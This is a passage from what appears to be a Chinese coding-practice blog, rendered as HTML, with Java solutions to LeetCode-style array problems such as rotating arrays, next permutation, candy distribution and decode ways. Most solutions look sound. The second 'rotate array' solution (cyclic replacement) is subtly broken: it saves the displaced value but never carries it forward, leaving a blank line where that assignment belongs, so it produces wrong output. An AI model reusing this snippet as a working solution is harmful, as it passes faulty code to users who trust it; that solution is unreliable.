class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-旋转数组"><a href="#2-旋转数组" class="headerlink" title="2. 旋转数组"></a>2. 旋转数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        k %= nums.length;</span><br><span class="line">        reverse(nums, <span class="number">0</span>, nums.length-<span class="number">1</span>);</span><br><span class="line">        reverse(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">        reverse(nums, k, nums.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp = nums[start];</span><br><span class="line">            nums[start] = nums[end];</span><br><span class="line">            nums[end] = temp;</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//环状替换</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        k  = k % n;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> start = <span class="number">0</span>; count &lt; n; start++)&#123;</span><br><span class="line">            <span class="keyword">int</span> curr =  start;</span><br><span class="line">            <span class="comment">//保存要被替换的位置上的值</span></span><br><span class="line">            <span class="keyword">int</span> prev = nums[start];</span><br><span class="line">            <span class="comment">//循环替换</span></span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> next = (curr + k) % n;</span><br><span class="line">                <span class="keyword">int</span> tmp = nums[next];</span><br><span class="line">                nums[next] = prev;</span><br><span class="line">                </span><br><span class="line">                curr = next;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(start != curr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-非递减数组"><a href="#3-非递减数组" class="headerlink" title="3. 非递减数组"></a>3. 非递减数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPossibility</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">2</span> &gt;= <span class="number">0</span> &amp;&amp; nums[i] &lt; nums[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                    nums[i] = nums[i - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-汇总区间"><a href="#4-汇总区间" class="headerlink" title="4. 汇总区间"></a>4. 汇总区间</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">summaryRanges</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; ret = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">int</span> low = i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] + <span class="number">1</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> high = i - <span class="number">1</span>;</span><br><span class="line">            StringBuffer temp = <span class="keyword">new</span> StringBuffer(Integer.toString(nums[low]));</span><br><span class="line">            <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">                temp.append(<span class="string">"-&gt;"</span>);</span><br><span class="line">                temp.append(Integer.toString(nums[high]));</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(temp.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-缺失的区间"><a href="#5-缺失的区间" class="headerlink" title="5. 缺失的区间"></a>5. 缺失的区间</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">findMissingRanges</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lower, <span class="keyword">int</span> upper)</span></span>&#123;</span><br><span class="line">List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">long</span> pre = lower - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == pre + <span class="number">2</span>)&#123;</span><br><span class="line">                res.add(String.valueOf(pre + <span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i] &gt; pre + <span class="number">2</span>)&#123;</span><br><span class="line">                res.add((pre + <span class="number">1</span>) + <span class="string">"-&gt;"</span> + (nums[i] - <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            pre = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(upper == pre + <span class="number">1</span>)&#123;</span><br><span class="line">            res.add(String.valueOf(pre + <span class="number">1</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(upper &gt; pre + <span class="number">1</span>)&#123;</span><br><span class="line">            res.add((pre + <span class="number">1</span>) + <span class="string">"-&gt;"</span> + upper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-下一个排列"><a href="#6-下一个排列" class="headerlink" title="6. 下一个排列"></a>6. 下一个排列</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 找到尽量靠右的【较小数】</span></span><br><span class="line">        <span class="keyword">int</span> i = nums.length - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[i + <span class="number">1</span>]) i--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果找到了【较小数】</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 找到尽量靠右的【较大数】</span></span><br><span class="line">            <span class="keyword">int</span> j = nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[j]) j--;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 交换【较小数】和【较大数】</span></span><br><span class="line">            swap(nums, i, j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 反转【较小数】 i 之后的所有元素</span></span><br><span class="line">        reverse(nums, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = start, right = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            swap(nums, left, right);</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = nums[i];</span><br><span class="line">        nums[i] = nums[j];</span><br><span class="line">        nums[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-分发糖果"><a href="#7-分发糖果" class="headerlink" title="7. 分发糖果"></a>7. 分发糖果</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">candy</span><span class="params">(<span class="keyword">int</span>[] ratings)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = ratings.length;</span><br><span class="line">        <span class="keyword">int</span>[] left = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; ratings[i] &gt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                left[i] = left[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> right = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; ratings[i] &gt; ratings[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += Math.max(left[i], right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-种花问题"><a href="#8-种花问题" class="headerlink" title="8. 种花问题"></a>8. 种花问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPlaceFlowers</span><span class="params">(<span class="keyword">int</span>[] flowerbed, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flowerbed == <span class="keyword">null</span> || flowerbed.length == <span class="number">0</span>) <span class="keyword">return</span> n == <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 当前全0区段中连续0的数量，刚开始预设1个0，因为开头花坛的最左边没有花，可以认为存在一个虚无的0</span></span><br><span class="line">        <span class="keyword">int</span> countOfZero = <span class="number">1</span>; </span><br><span class="line">        <span class="comment">// 可以种的花的数量</span></span><br><span class="line">        <span class="keyword">int</span> canPlace = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> bed : flowerbed) &#123;</span><br><span class="line">            <span class="comment">// 遇到0，连续0的数量+1</span></span><br><span class="line">            <span class="keyword">if</span> (bed == <span class="number">0</span>) &#123; </span><br><span class="line">                countOfZero++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 遇到1，结算上一段连续的0区间，看能种下几盆花：(countOfZero-1)/2</span></span><br><span class="line">                canPlace += (countOfZero-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (canPlace &gt;= n) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                countOfZero = <span class="number">0</span>; <span class="comment">// 0的数量清零，开始统计下一个全0分区</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后一段0区还未结算：</span></span><br><span class="line">        countOfZero++; <span class="comment">// 最后再预设1个0，因为最后花坛的最右边没有花，可以认为存在一个虚无的0</span></span><br><span class="line">        canPlace += (countOfZero-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> canPlace &gt;= n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-柠檬水找零"><a href="#9-柠檬水找零" class="headerlink" title="9. 柠檬水找零"></a>9. 柠檬水找零</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">lemonadeChange</span><span class="params">(<span class="keyword">int</span>[] bills)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> five = <span class="number">0</span>, ten = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> bill : bills) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bill == <span class="number">5</span>) &#123;</span><br><span class="line">                five++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bill == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (five == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                five--;</span><br><span class="line">                ten++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (five &gt; <span class="number">0</span> &amp;&amp; ten &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    five--;</span><br><span class="line">                    ten--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (five &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">                    five -= <span class="number">3</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-解码方法二"><a href="#10-解码方法二" class="headerlink" title="10. 解码方法二"></a>10. 解码方法二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MOD = <span class="number">1000000007</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="comment">// a = f[i-2], b = f[i-1], c = f[i]</span></span><br><span class="line">        <span class="keyword">long</span> a = <span class="number">0</span>, b = <span class="number">1</span>, c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            c = b * check1digit(s.charAt(i - <span class="number">1</span>)) % MOD;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                c = (c + a * check2digits(s.charAt(i - <span class="number">2</span>), s.charAt(i - <span class="number">1</span>))) % MOD;</span><br><span class="line">            &#125;</span><br><span class="line">            a = b;</span><br><span class="line">            b = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check1digit</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">'0'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ch == <span class="string">'*'</span> ? <span class="number">9</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">check2digits</span><span class="params">(<span class="keyword">char</span> c0, <span class="keyword">char</span> c1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c0 == <span class="string">'*'</span> &amp;&amp; c1 == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c0 == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> c1 &lt;= <span class="string">'6'</span> ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c1 == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c0 == <span class="string">'1'</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c0 == <span class="string">'2'</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (c0 != <span class="string">'0'</span> &amp;&amp; (c0 - <span class="string">'0'</span>) * <span class="number">10</span> + (c1 - <span class="string">'0'</span>) &lt;= <span class="number">26</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第三天"><a href="#刷题第三天" class="headerlink" title="刷题第三天"></a>刷题第三天</h2><h3 id="1-转置矩阵"><a href="#1-转置矩阵" class="headerlink" title="1. 转置矩阵"></a>1. 转置矩阵</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] transpose(<span class="keyword">int</span>[][] matrix) &#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.length, n = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] transposed = <span class="keyword">new</span> <span class="keyword">int</span>[n][m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                transposed[j][i] = matrix[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transposed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-旋转图像"><a href="#3-旋转图像" class="headerlink" title="3. 旋转图像"></a>3. 旋转图像</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = matrix.length;</span><br><span class="line">        <span class="comment">//水平翻转</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n /<span class="number">2</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">                matrix[i][j] = matrix[n - i -<span class="number">1</span>][j];</span><br><span class="line">                matrix[n - i - <span class="number">1</span>][j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//原地对角线翻转 即原地转置 与申请一个新数组来转置不同，若是新数组，j &lt; n，但这里要注意是 j &lt; i</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">                matrix[i][j] = matrix[j][i];</span><br><span class="line">                matrix[j][i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-有效的数独"><a href="#4-有效的数独" class="headerlink" title="4. 有效的数独"></a>4. 有效的数独</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 